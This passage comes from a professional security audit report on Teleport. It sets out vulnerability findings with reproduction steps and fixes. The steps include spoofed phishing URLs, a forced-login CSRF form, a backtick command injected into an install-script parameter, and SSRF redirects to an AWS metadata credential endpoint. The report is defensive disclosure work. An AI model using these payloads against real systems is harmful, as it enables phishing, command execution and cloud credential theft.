direct connection link. The attack would be mostly \neffective just with clusters consisting of OpenSSH nodes only. \n\nRemediation \n\nResolve only to the ﬁrst Address Record entry of a node name or reject DNS records with multiple (>2) \nAddress entries. \n\nResources \n\n- \"Blind SSRF exploitation\", Wallarm Labs \n\nhttps://lab.wallarm.com/blind-ssrf-exploitation/ \n\n18\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-4 Content Spooﬁng Abusing Error Pages\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInsecure Design\n\n/lib/web/apiserver.go:805, :906, :986 \n/lib/web/saml.go:94\n\nClosed\n\nWhile reviewing the web application source code, Doyensec discovered that the authentication error \nreporting functionality used to show a rejected authorization message is vulnerable to content spooﬁng. \n\nThe affected endpoint (/web/msg/error/login_failed) is used in: \n\nA. The samlACS function (/lib/web/saml.go:94) when an error occurs while processing the \n\ncallback from SAML provider \n\nB. The oidcLoginWeb function (/lib/web/apiserver.go:805) when query parameters are missing \n\nor the CSRF token can't be extracted from cookies \n\nC. The githubCallback function (/lib/web/apiserver.go:906) and the oidcCallback function (/\nlib/web/apiserver.go:986) when an error occurs while processing the callback from Github or \nthe CSRF token can't be veriﬁed \n\nThis content spooﬁng injection attack type is related to an attacker being able to inject arbitrary titles or \ntext into some parameters, which are rendered to the victim’s user on the trusted domain. The attack is \nusually conducted via social engineering or phishing. \n\nReproduction Steps \n\nIn the following example of (A) exploitation, an attacker crafted a convincing message injecting UTF-8 \nformatting entities to change the page. When the victim opens the following page: \n\n- https://doyensec-2020.gravitational.io:3080/web/msg/error/login_failed?\n\ndetails=%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2\nD%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2DATTENTION%2D%2D%\n2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D\n%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2DYou%20have%20been%20logged%20out%20be\ncause%20your%20session%20expired%21%20In%20order%20to%20login%2C%20copy%20and%20paste%20the\n%20following%20link%20to%20conﬁrm%20your%20identity%3A%E2%80%84%E2%80%84%E2%80%84%E2%80%8\n4%E2%80%84%E2%80%84%E2%80%84%E2%80%84%E2%80%84%E2%80%84%E2%80%84%2D%2D%2D%2D%2D%\n2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D\n%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2\nD%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D\n\n19\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%20https%\n3A%2F%2Fsimilar%2Ephishing%2Eco%2F98d787f7sfd676s%2Fauth%20%0A%0D%20%20%20 \n\nThe possible output: \n\nIt is also possible to similarly exploit (B): \n\n- https://doyensec-2020.gravitational.io:3080/web/launch/legit-\n\napp%20to%20any%20application%20within%20any%20cluster.%E2%80%81%E2%80%81%E2%80%81Try%20re-\nlaunching%20the%20application%20by%20copying%20and%20pasting%20this%20URL%20in%20the%20address\n%20bar:\n%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%8\n1%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%\n81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80\n%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%0Aphishing-2020.g\nravitational.io:3080%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2\n%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E\n2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%\nE2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81%E2%80%81\n%E2%80%81%E2%80%81%E2%80%81%E2%80%81%0AYou%20can%20use%20this%20URL%20to%20access \n\nThe possible output: \n\n20\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nImpact \n\nIn a successful attack scenario, an attacker could craft a credible response from the Teleport service, \nusing it as a secondary step in a coordinated phishing attack. \n\nComplexity \n\nComplexity to craft the exploit is trivial, however the payload must be delivered using social engineering \n(e.g. phishing). \n\nRemediation \n\nLimit the possible set of error messages, only displaying valid error types. If not possible, limit the error \nmessage length. \n\nResources \n\n- \"Content Spooﬁng\", OWASP Community Guides \n\nhttps://owasp.org/www-community/attacks/Content_Spooﬁng \n\n21\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-5 Existence Leak of Label-restricted Resources\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInformation Exposure\n\nlib/web/apiserver.go\n\nClosed\n\nCluster, node, and application labels are arbitrary labels limiting access to only users whitelisting the \nlabels in their roles. The administrator of the root cluster controls the labels of every remote cluster. If a \nuser's role is missing the label, the cluster should be be invisible to both the web UI and the tsh clusters. \n\nNonetheless, Doyensec found that when an unauthorized user tries to access a restricted cluster, a non-\nopaque response will be returned in a most cases, leaking its existence. This also happens when a \nconnection to a label-restricted application is attempted. \n\nReproduction Steps \n\nThe restricted cluster in these examples is represented by doyensec-leaf, having the env=secret label \nset. All the endpoints enumerated have been requested by a user with an explicit deny rule: \n\nkind: role \nmetadata: \n name: minimal \nspec: \n deny: \n cluster_labels: \n env: secret \n\n1. The web context endpoint handled by the getUserContext function (lib/web/apiserver.go:437) \n\nwill still leak restricted clusters metadata: \n\nGET /v1/webapi/sites/doyensec-leaf/context HTTP/1.1 \nHost: doyensec-2020.gravitational.io:3080 \n\nHTTP/1.1 200 OK \nContent-Type: application/json \nConnection: close \n\n{\"authType\":\"local\",\"userName\":\"phos\",\"userAcl\":{\"sessions\":\n{\"list\":false,\"read\":true,\"edit\":false,\"create\":false,\"remove\":false},\"authConnec\ntors\":\n{\"list\":false,\"read\":false,\"edit\":false,\"create\":false,\"remove\":false},\"roles\":\n{\"list\":false,\"read\":false,\"edit\":false,\"create\":false,\"remove\":false},\"users\":\n{\"list\":false,\"read\":false,\"edit\":false,\"create\":false,\"remove\":false},\"trustedCl\nusters\":\n{\"list\":false,\"read\":false,\"edit\":false,\"create\":false,\"remove\":false},\"events\":\n\n22\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n{\"list\":true,\"read\":true,\"edit\":false,\"create\":false,\"remove\":false},\"tokens\":\n{\"list\":false,\"read\":false,\"edit\":false,\"create\":false,\"remove\":false},\"nodes\":\n{\"list\":true,\"read\":true,\"edit\":false,\"create\":false,\"remove\":false},\"appServers\"\n:\n{\"list\":true,\"read\":true,\"edit\":false,\"create\":false,\"remove\":false},\"sshLogins\":\n[\"root\"]},\"cluster\":{\"name\":\"doyensec-\nleaf\",\"lastConnected\":\"2020-11-19T13:26:35.632668831Z\",\"status\":\"online\",\"nodeCou\nnt\":1,\"publicURL\":\"doyensec-leaf.gravitational.io:3080\",\"authVersion\":\"5.0.0-\nrc.1\",\"proxyVersion\":\"5.0.0-rc.1\"},\"accessStrategy\":\n{\"type\":\"optional\",\"prompt\":\"\"}} \n\n2. All the web API endpoints including the :site URI parameter will also return a non-opaque response, \n\ne.g.: \n\nHTTP/1.1 403 Forbidden \nContent-Type: application/json \nContent-Length: 23 \nConnection: close \n\n{\"message\":\"need auth\"} \n\nIn case a :site is not found a 404 status code will be returned: \n\nHTTP/1.1 404 Not Found \nContent-Type: application/json \nContent-Length: 49 \nConnection: close \n\n{\"message\":\"cluster \\\"doyensec-abc\\\" is not found\"} \n\nLeaking its existence. \n\n3. When authenticating to a label-restricted AAP application, a 403 status code returning a \"Forbidden\" \nmessage is displayed (e.g. requesting a label-restricted secret.doyensec-2020.gravitational.io:3080 \napplication): \n\nHTTP/1.1 403 Forbidden \nContent-Length: 10 \nContent-Type: text/plain; charset=utf-8 \nX-Content-Type-Options: nosniff \nConnection: close \n\nForbidden \n\nImpact \n\nAn attacker could gather information on installed Teleport Auth and Proxy versions of restricted clusters, \nother than leaking restricted cluster or application existence through the various web APIs. \n\n23\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nComplexity \n\nLow. An attacker should know the restricted cluster or application name and have access to the web UI \nthrough the valid account. \n\nRemediation \n\nProvide opaque error causes for restricted clusters, nodes, or AAP applications. The Teleport service \nshould return the same error in case of unauthorized use in order to guarantee the invisibility of the \nrestricted resources. \n\n24\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-6 Insecure Default TLSClientConﬁg In Dial Function\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nInformational\n\nInsufﬁcient Cryptography\n\nlib/kube/proxy/roundtrip.go:123\n\nClosed\n\nIn the Kubernetes' SPDY roundtripper (SpdyRoundTripper), the TLSClientConfig function implements \npkg/util/net.TLSClientConfigHolder for proper TLS checking during proxying, retrieving the \ntlsConfig holding the TLS conﬁguration settings to use when connecting to the remote server. \n\nThe k8s dialer implementation dial() in lib/kube/proxy/roundtrip.go:123 used to dial the host \nspeciﬁed by URL is not validating if the TLSClientConfig is correctly set up. The function is nonetheless \ncalling utils.TLSDial (lib/utils/tlsdial.go:22) which sets tlsConfig to &tls.Config{}, not \nsetting a TLS MinVersion, CipherSuites or other secure parameters. Not checking that the TLS \nconﬁguration initialization is secure may expose the solution to several TLS-based attacks. \n\nReproduction Steps \n\nThis is a source code ﬁnding. The dial function is deﬁned as: \n\nfunc (s *SpdyRoundTripper) dial(url *url.URL) (net.Conn, error) { \n ... \n var conn *tls.Conn \n var err error \n if s.dialWithContext == nil { \n\nconn, err = tls. Dial(\"tcp\", dialAddr, s.tlsConfig) \n\n } else { \n\nconn, err = utils.TLSDial(s.ctx, s.dialWithContext, \"tcp\", dialAddr, \n\ns.tlsConfig) \n } \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n\n // Client handshake will verify the server hostname and cert chain. That \n // way we can err our before first read/write. \n if err := conn. Handshake(); err != nil { \nreturn nil, trace.Wrap(err) \n\n } \n\n return conn, nil \n} \n\n25\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nWhile the TLSDial establishing the TLS connection is deﬁned as: \n\nfunc TLSDial(ctx context.Context, dial DialWithContextFunc, network, addr string, \ntlsConfig *tls.Config) (*tls.Conn, error) { \n if tlsConfig == nil { \n\ntlsConfig = &tls.Config{} \n\n } \n\n plainConn, err := dial(ctx, network, addr) \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n\n ... \n} \n\nImpact \n\nIn the current implementation the NewSpdyRoundTripperWithDialer function used to create new \nSpdyRoundTripper instances is always providing a proper tlsConfig conﬁguration object (lib/kube/\nproxy/forwarder.go), hence the issue has been marked as “Informational”. However, not checking the \nTLS conﬁguration initialization may expose the solution to several TLS-based attacks. \n\nComplexity \n\nWhile a downgrade attack or a version rollback attack have been a consistent problem with the SSL/\nTLS family of protocols, their complexity may vary. Such attacks would still require a malicious actor to be \npositioned in the same target network segment. \n\nRemediation \n\nSeveral steps could be taken to reduce the highlighted risk: \n\n- Raise an error and abort the connection in case a certiﬁcate is not passed; \n- Create a dedicated function only meant for unit tests with a distinct name (e.g. UnsafeNewSpdy \nRoundTripperWithDialer). In this case, consider introducing pre-commit hooks to detect any \ninsecure use of such function. \n\n26\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-7 Login CrossSite Request Forgery On Application Access \nFlow\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nCross Site Request Forgery (CSRF)\n\nlib/web/app/fragment.go\n\nClosed\n\nDue to the nature of how the web was designed, there is an implicit trust relationship between the user \nand the associated web server. It is assumed that the user will always make a request on their own \nbehalf. This assumption is violated through a vulnerability class known as Cross-Site Request Forgery 4\n(CSRF). \n\nIn an attack-scenario, a request is kicked off by an attacker on behalf of a victim. The victim simply needs \nto click a malicious link or to visit a page holding a snippet of attacker constructed javascript for a forged \nrequest to be sent from their browser. The attacker is then performing actions through the victim’s \nbrowser, meaning cookies and authentication data will be sent automatically. \n\nA particular category of CSRF attacks is named \"forced logins\". Forced login CSRF is a type of attack \nwhere the attacker can force the user to log in to the attacker’s account on a web application and thus \nreveal information about what the user is doing while logged in, steal provided conﬁdential information, \nor prevent and simulate actions completion. Because of this, the actual risk varies depending on the \ntargeted application. \n\nWhile the Teleport web UI action and the application launch URL are protected by the X-CSRF-Token \nheader, Teleport's AAP authentication ﬂow to the application is missing this token-based mitigation, \nexposing users to login CSRF. \n\nReproduction Steps \n\nThe application route /x-teleport-auth is used to set the authentication cookie value passed via URI \nfragment to the application domain. To do this, the Javascript code on the page issues a fetch-based \nPOST request to the same route, passing the JSON-encoded cookie_value in its body: \n\nPOST /x-teleport-auth HTTP/1.1 \nHost: dumper.doyensec-2020.gravitational.io:3080 \nConnection: close \nContent-Length: 83 \nContent-Type: application/json; charset=utf-8 \nAccept: */* \nOrigin: https://dumper.doyensec-2020.gravitational.io:3080 \n\n https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) \n4\n\n27\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nCookie: \ngrv_app_session=a1b2c3e4f5c33ec796a2f6d84e71d33f5a7c817c59939d447eb02bb9646f7e24; \n\n{\"cookie_value\":\"f5e4c3b2a17ed742627f615ea4d856e62dc55835a29e49fa7aaba1677c83b068\n1\"} \n\nSince no CSRF mitigations are set, an attacker (Eve) can retrieve her cookie_value in a normal login ﬂow \nto the victimapp application and trick the victim (Alice) into sending the following payload: \n\n<html> \n <!-- CSRF PoC for victimapp.doyensec-2020.gravitational.io forced login --> \n <body> \n <script>history.pushState('', '', '/')</script> \n <form action=\"https://victimapp.doyensec-2020.gravitational.io:3080/x-\nteleport-auth\" method=\"POST\" enctype=\"text/plain\"> \n <input type=\"hidden\" \nname=\"&#123;&quot;cookie&#95;value&quot;&#58;&quot;f5e4c3b2a17ed742627f615ea4d856\ne62dc55835a29e49fa7aaba1677c83b0681&quot;&#13;&#10;&#125;\" value=\"\" /> \n <input type=\"submit\" value=\"Submit request\" /> \n </form> \n </body> \n</html> \n\nEven if the CSRF form uses a different encoding type (text/plain) compared to the original request and \nthe request JSON contains the equal (=) character, the application will process the request anyway. \n\nImpact \n\nThe risk varies depending on the targeted application and is hard to evaluate from a black-box \nperspective, since the application's risk-proﬁle will vary among customers. A victim could unknowingly \nsubmit conﬁdential information or perform actions that could later be retrieved or undone by the attacker. \nSince applications behind Teleport's AAP won't probably be public, the attacker should ﬁnd a way to \nperform the registration on the internal application. \n\nComplexity \n\nMedium, since an attacker: \n\n- Needs a valid account on the targeted application; \n- Needs to trick the victim user into visiting an attacker-controlled page. \n\nRemediation \n\nImplement a CSRF token-based mitigation similar to the OAuth state token to prevent similar attacks. \nThe value of the generated token should be non-predictable for this mitigation to work. \n\nResources \n\n- \"Cross-Site Request Forgery Prevention Cheat Sheet\", OWASP Cheat Sheet Series \n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-\nSite_Request_Forgery_Prevention_Cheat_Sheet.html \n\n28\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-8 Parameter Injection In Install App Script\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInjection Flaws (SQL, XML, Command, Path, etc)\n\ne/lib/web/nodes.go:82\n\nClosed\n\nWhen adding an application or a new node through the Teleport Web UI, users can choose to \nautomatically set up their access through an auto-installer bash script. For applications, this script will be \ndynamically generated providing the name and URL of the application to install the Teleport agent. The \nscript is retrieved using the: \n\n/scripts/:token/install-app.sh \n\nWhile in this endpoint's function handler (getAppJoinScriptHandle) an unescapeAndStripParameter \nfunction is employed to escape the uri and name parameters, an attacker could abuse the endpoint to \nreturn a seemingly trusted script from a known origin containing injected commands. This is possible \nsince these characters are still allowed: \n\n- Backquotes/Backticks (`) used for command substitution \n- Backslashes (\\) to escape the inserted backslashes before the double quotes (\"), effectively \n\nescaping the backslashes replaced by the unescapeAndStripParameter function (\\\\\") \n\n- Environmental variables ($) \n- Comments (#) \n- Null commands (;) and command groups ((a=hello; echo $a)) \n- New lines, pipes, command separators, terminators, or control characters \n\nReproduction Steps \n\nAs a way of example, consider the following script served by the doyensec-2020 test cluster: \n\nhttps://doyensec-2020.gravitational.io:3080/scripts/69c1f83df2e3d7edd6d35f724aba43a7/\ninstall-app.sh?name=test&uri=http%3A%2F%2Flocalhost%3A8080%2F%60whoami%60 \n\nThe resulting bash script will contain (on line 45): \n\n# the default value of each variable is a templatable Go value so that it can \n# optionally be replaced by the server before the script is served up \nTELEPORT_VERSION=\"5.0.0-rc.1\" \nTARGET_HOSTNAME=\"doyensec-2020.gravitational.io\" \nTARGET_PORT=\"3080\" \nJOIN_TOKEN=\"69c1f83df2e3d7edd6d35f724aba43a7\" \nCA_PIN_HASH=\"sha256:99ea89949d85db13336e70f62deb3e44423545d729a080b60d95608d2f669\n402\" \nAPP_INSTALL_MODE=\"true\" \n\n29\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nAPP_NAME=\"test\" \nAPP_URI=\"http://localhost:8080/`whoami`\" \n\nWhen run, the APP_URI variable will be evaluated as \"http://localhost:8080/root\". \n\nImpact \n\nAn attacker could inject arbitrary commands in the Application installation script served by the Teleport \nWeb service. \n\nComplexity \n\nThe attack is only useful in a few scenarios, since a valid join token and a user interaction is still needed \nto serve and run the script. Because of this, the complexity of this attack is considered to be very high. \n\nRemediation \n\nEnsure that the passed variables are correctly escaped, possibly only allowing alphanumeric characters \nfor the name value (e.g. /^[\\w-_.]+$/) and a restricted set of characters for the URI value (e.g. /^[\\w-\n\\/:@?=_.]+$/). \n\n30\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-9 Missing Applications Session Invalidation On Parent \nSession Invalidation\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInsufﬁcient Authentication and Session \nManagement\n\n/lib/web/app/logout.go:30 \n/lib/web/apiserver.go:1254, :1289 \n/e/lib/web/users.go:18\n\nRisk Accepted\n\nThe Teleport Web UI session acts as a parent session that is used to grant sub-sessions for the hosted \napplications, so the user does not have to re-authenticate every time they access a served application. \nHowever, the TTL for the Web UI and AAP application sessions still remains independent. \n\nWhile this approach was speciﬁcally chosen for various compliance reasons, Teleport should still react to \nany event indicating a session compromise or change in the user's privileges. Examples of such events \ncan be manual parent session invalidations (user-initiated logouts through the Teleport Web UI), role \nchanges, or successful password resets. \n\nIn particular, an explicit invalidation of the parent web session should cause all application sessions to \ncease. \n\nReproduction Steps \n\nTo reproduce this insecure design, consider the following steps: \n\n1. Alice logs in with her account on Teleport's Web; \n2. Alice accesses an AAP-protected application; \n3. Alice logs out with her account, reset her password, or she's assigned a role with different privileges; \n4. Alice is still able to use her previously issued session in the AAP-protected application. \n\nImpact \n\nLow. An attacker will be granted persistence by default because of this design choice. The solution \nshould proactively help its users to secure their accounts in the case of a malicious takeover. \n\nComplexity \n\nHigh. An attacker would need to steal or otherwise obtain a valid user session. \n\n31\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nRemediation \n\nInvalidate every AAP application session if the parent session is manually invalidated, if the role \nassociated with the user is updated or changed, or if a successful password change occurs. \n\nThis could be achieved by adapting the existing logout methods of every application (/x-teleport-\nlogout) and rotating the JWT signer in case of a successful password reset or role change. \n\nResources \n\n- \"Forgot Password Service\", OWASP Cheat Sheet Series \n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html \n\n- \"AC-12 SESSION TERMINATION\", NIST Security and Privacy Controls for Federal Information Systems \n\nand Organizations 800-53 (Rev. 4) \nhttps://nvd.nist.gov/800-53/Rev4/control/AC-12 \n\n32\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-10 Systemic Server-Side Request Forgery in Single Sign-On\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nMedium\n\nServer-Side Request Forgery (SSRF)\n\nlib/auth/oidc.go \ngithub.com/coreos/go-oidc/oidc\n\nRisk Accepted\n\nA Server Side Request Forgery (SSRF) attack describes the ability of an attacker to create network \nconnections from a vulnerable web application to the internal network and other Internet hosts. \nFrequently, a SSRF vulnerability is used to attack internal services placed behind a ﬁrewall and not directly \naccessible from the Internet. \n\nIn Teleport, the OpenID Connect (OIDC) connector for Single Sign-On (SSO) can be leveraged to initiate an \nHTTP or HTTPS connection and potentially gather information about the internal infrastructure of the \napplication. For instance, this attack can be used to access InﬂuxDB or retrieve AWS keys via the AWS \nmetadata API. \n\nAfter exchanging an authentication code for a token, the go module go-oidc is used to fetch the OIDC \ndiscovery conﬁguration from the OpenID Provider (OP). The following code starting at vendor/\ngithub.com/coreos/go-oidc/oidc/provider.go#634 is used: \n\nu, err := url.Parse(r.issuerURL) \n… \nu.Path = strings.TrimSuffix(u.Path, \"/\") + discoveryConfigPath \ndiscoveryURL := u.String() \nreq, err := http.NewRequest(\"GET\", discoveryURL, nil) \n… \nresp, err := r.hc.Do(req) \n\nA badly-behaving OpenID Provider can respond with a redirect. The Teleport server follows the redirect, \neven to non-HTTPS or internal URLs. The full response body, if any, is then added to the audit log by the \nerror handler. \n\nif err = json.Unmarshal(data, &cfg); err != nil { \n return cfg, trace. Wrap(err, \"failed to decode provider response %q\", \nstring(data)) \n\n33\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nReading the response requires read access to the audit logs. Since the OP cannot read the response body \nthemselves, from their perspective this is a “blind” SSRF. However, numerous techniques exist to infer \nresults by either using timing or DNS requests . For example, an attacker may infer their success or failure \nby comparing the web application latency on different requests and detect if there was a reply or not from \nan internal remote host. \n\n5\n\nThe vulnerability is present in Teleport’s own use of the net/http library as well. See lib/auth/\noidc.go#586: \n\nendpoint := pc.UserInfoEndpoint.String() \nerr = isHTTPS(endpoint) \nif err != nil { \n return nil, trace.Wrap(err) \n} \nlog.Debugf(\"Fetching OIDC claims from UserInfo endpoint: %q.\", endpoint) \n\nreq, err := http.NewRequest(\"GET\", endpoint, nil) \nif err != nil { \n return nil, trace.Wrap(err) \n} \nreq.Header.Set(\"Authorization\", fmt.Sprintf(\"Bearer %s\", accessToken)) \n\nresp, err := hc.Do(req) \n\nThe OP can respond to the user endpoint with a redirect to a non-HTTPS or internal URL and the Teleport \nserver will follow the redirect. Depending on the error, information may be disclosed through the audit log. \n\nOther URLs in the discovery conﬁguration, such as the keys endpoint or the token URL (which is accessed \nby the POST method) are also vulnerable. Furthermore, the SAML connectors are also vulnerable via \nentity_descriptor_url in lib/services/saml.go. \n\n https://lab.wallarm.com/blind-ssrf-exploitation/\n5\n\n34\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nReproduction Steps \n\nTo see how a default Go HTTP client is vulnerable, set endpoint to an HTTPS server which 307 redirects \nto a private-network or localhost address. Check that the response or error shows the expected result. \n\nActually reproducing the vulnerability for OIDC requires setting up a malicious OP: \n\nresp, err := http.GET(endpoint) \n\n1. Add an OP under your control via an Auth Connector. \n2. Change the /.well-known/openid-configuration endpoint to respond with a 307 redirect to the \nURL of a controlled web server (e.g. Burp’s Collaborator or a standard web server with full requests \nlogging). \n\n3. Login to the Teleport proxy using the OP. \n4. During the redirect to https://<PROXY>/v1/webapi/oidc/callback?code=…&state=…, you can \n\nobserve the request hitting the external endpoint: \n\nGET /.well-known/openid-configuration HTTP/1.1 \n\n Host: b8bf93f5965a.ngrok.io \n User-Agent: Go-http-client/2.0 \n\nNote the particular User-Agent, which demonstrates that the request has been made by the vulnerable \nweb application. The response to the redirect can be seen in the audit logs. \n\nThe redirect could also be pointed at: \n\n- InﬂuxDB http://localhost:8086/query?q=SHOW%20DIAGNOSTICS \n- AWS metadata http://169.254.169.254/latest/meta-data/iam/security-credentials/doyensec-2020-\n\ncluster \n\nThis redirect can also use private IP addresses, opening up the possibility for a Cross-Site Port Attack \n(XSPA), which allows an attacker to enumerate services used by the web application or exposed by the \nvictim server or neighbor servers, conducting a port scan from the context of the vulnerable host. \n\nDoyensec found the feasibility of this attack by measuring signiﬁcant time differences between requests \nissued to inaccessible ﬁltered ports (which result in timeout) and open ports. \n\nImpact \n\nHigh. By leveraging this vulnerability, an attacker can gather information about the local system, internal \nnetwork, and potentially machines in neighbor networks. The ability to issue arbitrary requests to internal \nendpoints may also cause unwanted interactions with an internal systems. By retrieving AWS IAM \ncredentials, an attacker has read/write access to certain resources in S3, DynamoDB (including the audit \nlog), and SSM. \n\n35\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nNote that in our testing environment, the Auth Server and Nodes were on the same machine with the \nsame IAM user. In the high availability Teleport AWS setup recommended in the documentation , this \nSSRF would expose keys for the IAM user of the Auth Server, which could be different from that of the \nNodes. \n\n6\n\nComplexity \n\nHigh. The blind SSRF requires a malicious OP to be added as an OIDC auth connector, which already \nrequires a high level of access. Alternatively, a compromise of a trusted OP is required. Reading back \nresponses requires read access to the audit log, which again is a privileged operation. \n\nRemediation \n\nEnsure that the request is issued to a safe host, possibly limiting the response content in the audit log. \n\nAttempts to guard against Server Side Request Forgery are often implemented incorrectly, by either \nblocking all IP addresses, not handling IPv6, following HTTP redirects, or having TOCTTOU issues. \n\n7\n\nWe do not have a speciﬁc drop-in anti-SSRF library for Golang to recommend. The strategy of making a \nsafe custom http/Transport and net/Dialer is outlined at https://www.agwa.name/blog/post/\npreventing_server_side_request_forgery_in_golang, but requires changes. Since unencrypted requests \nshould not be used anywhere during the OIDC ﬂow, DialTLSContext can be set to a modiﬁed \nsafeSocketControl function, and the DialContext (for unencrypted requests) should always raise an \nerror. \n\nThis strategy protects against SSRF by checking whether the IP belongs to a private network (RFC 1918) \nbefore an http.Client connects. \n\nSSRF can also be mitigated by enforcing strong network isolation from the vulnerable web application \n(e.g. using iptables). \n\nResources \n\n- \"Server-Side Request Forgery\", OWASP \n\nhttps://www.owasp.org/index.php/Server_Side_Request_Forgery \n\n- \"Server-Side Request Forgery Prevention Cheat Sheet\", OWASP Cheat Sheet Series \n\nhttps://cheatsheetseries.owasp.org/cheatsheets/\nServer_Side_Request_Forgery_Prevention_Cheat_Sheet.html \n\n https://gravitational.com/teleport/docs/aws-oss-guide/#teleport-introduction\n6\n\n Time of check to time of use\n7\n\n36\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-11 CLI Content Spooﬁng Through Request Reason Medium\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nMedium\n\nInsecure Design\n\ne/lib/web/access_request.go:29 \nlib/auth/auth.go:1602\n\nClosed\n\nTeleport 4.2 introduced the ability for users to request additional roles through the Approval Workﬂow \nAPI. This API makes it easy to dynamically approve or deny these requests. This is done through the tctl \nCLI, manually granting a role by copy-pasting the UUID token associated to the request in the dedicated \nrequest command. By way of example, a Teleport administrator can list recent requests using: \n\n$ tctl request ls \nToken Requestor Metadata Created At (UTC) Status \n----------------------------- --------- -------------- ------------------- -------- \nbc8ca931-fec9-4b15-9a6f-20c13 alice roles=dba 07 Nov 19 19:38 UTC PENDING \n\nAnd approve them with: \n\n$ tctl request approve bc8ca931-fec9-4b15-9a6f-20c13 \n\nAfter approval, tsh will automatically manage a certiﬁcate re-issued with the newly requested roles \napplied. In order to provide greater insight into the requester's reasons, it is possible for an unprivileged \nuser to provide a reason for the elevation using tsh. \n\n$ tsh login --request-reason=\"...\" \n\nThe request reason is provided by the user and has no length or content limitations. This allows an 